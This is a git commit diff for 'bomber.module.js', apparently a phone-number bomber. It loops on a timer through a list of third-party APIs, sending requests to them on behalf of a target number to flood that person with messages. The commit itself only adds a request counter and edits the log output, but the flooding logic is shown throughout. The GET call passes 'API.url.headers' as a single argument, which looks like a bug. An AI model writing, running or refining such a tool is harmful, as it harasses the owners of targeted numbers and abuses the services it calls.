ddfcded9317f622f644f05af3fec9670c5126a35
hadi <hadiazari30@gmail.com>
2022-11-26 11:29:32 +0330

    Update bomber.module.js

--- src/functions/bomber.module.js
+++ src/functions/bomber.module.js
@@ -7,6 +7,7 @@ module.exports = ({ number }) => {
     if (validate !== 0) return console.log(color.red("ERROR :\nInvalid Format"));
 
     require('../routes.js').API({ number })
+    var q = 0
 
     setInterval(function () {
         for (let num = 0; num < list.length; num++) {
@@ -20,15 +21,15 @@ module.exports = ({ number }) => {
 
             if (API.method == "POST") {
                 axios.post(API.url, API.data, headers).then(function () {
-                    console.log(color.green(`Request From ${API.name} Sends To ${number} | ${num}`));
+                    console.log(color.green(`Request From ${API.name} Sends To ${number} | ${q++}`));
                 }).catch(error => {
-                    console.log(color.red(`ERROR :\n ${error}`));
+                    console.log(color.red(`ERROR :\n${error}`));
                 })
             } else {
                 axios.get(API.url.headers).then(function () {
-                    console.log(color.green(`Request From ${API.name} Sends To ${number} | ${num}`));
+                    console.log(color.green(`Request From ${API.name} Sends To ${number} | ${q++}`));
                 }).catch(error => {
-                    console.log(color.red(`ERROR :\n ${error}`));
+                    console.log(color.red(`ERROR :\n${error}`));
                 })
             }
         }
